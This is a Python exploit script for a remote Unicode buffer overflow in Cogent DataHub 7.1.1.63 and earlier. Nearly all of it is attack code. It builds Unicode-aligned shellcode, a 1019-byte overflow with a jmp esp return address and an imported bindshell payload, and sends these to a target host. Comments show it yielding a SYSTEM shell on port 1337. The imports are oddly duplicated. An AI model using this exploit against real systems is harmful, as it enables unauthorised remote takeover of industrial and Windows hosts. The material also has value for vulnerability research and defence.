#!/usr/bin/python
#
# Cogent Datahub <= v7.1.1.63 Remote Unicode Buffer Overflow Exploit
# tested on:
# - windows server 2003
# - windows XP sp3
# questions >> @net__ninja || @luigi_auriemma
# example usage:
# [mr_me@neptune cognet]$ ./cognet_overflow.py 192.168.114.130
#
# -----------------------------------------------------
# ------ Cogent Datahub Unicode Overflow Exploit ------
# ------------- Found by Luigi Auriemma ---------------
# --------- SYSTEM exploit by Steven Seeley -----------
#
# (+) Sending overflow...
# (+) Getting shell..
# Connection to 192.168.114.130 1337 port [tcp/menandmice-dns] succeeded!
# Microsoft Windows [Version 5.2.3790]
# (C) Copyright 1985-2003 Microsoft Corp.
#
# C:\Program Files\Cogent\Cogent DataHub\plugin\TCPMaster>whoami
# whoami
# nt authority\system
#
# C:\Program Files\Cogent\Cogent DataHub\plugin\TCPMaster>
import socket, sys

from time import sleep
from base64 import b64encode
from payload import buf
import socket
import socket, sys
import struct
import socket,time,sys,os
def shell_attack(target_machine, target_port):


# bindshell on port 1337


	align= b""
	align += b"\x54"			# push esp
	align += b"\x6f"
	align += b"\x58"			# pop eax
	align += b"\x6f"
	align += b"\x05\x6f\x11"	# add eax,11006f00   
	align += b"\x6f" 
	align += b"\x2d\x37\x01"	# sub eax,01003700
	align += b"\x6f"
	align += b"\x2d\x37\x10"	# sub eax,11003700
	align += b"\x6f"
	align += b"\x50"			# push eax
	align += b"\x6f"
	align += b"\x48"			# dec eax
	align += b"\x6f"
	align += b"\x48"			# dec eax
	align += b"\x6f"
	align += b"\x55"			# push ebp
	align += b"\x6f"
	align += b"\x59"			# pop ecx
	align += b"\x08"			# add [eax],cl (carve a 'RETN' onto the stack)
	align += b"\x6f"
	align += b"\x40"			# inc eax
	align += b"\x6f"
	align += b"\x40"			# inc eax
	align += b"\x6f\x41" * (48)	# inc ecx (will not effect to our payload)
	align += b"\x6f"
	align += b"\x62"			# becomes our carved RETN on the stack (0x61+0x62=0xc3)

	request = b"(domain \""
	request += b"\x61" * 1019
	request += b"\x7f\x55" 	# jmp esp 0x0055007f
	request += align
	request += buf
	request += b"\")\r\n"

	

	

	target = target_machine
	

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	try:
		s.connect((target,target_port))
	except:
		pass


	s.send(request)
	s.recv(1024)
	# wait for the target, sheesh.
	time.sleep(2)
	
	s.close()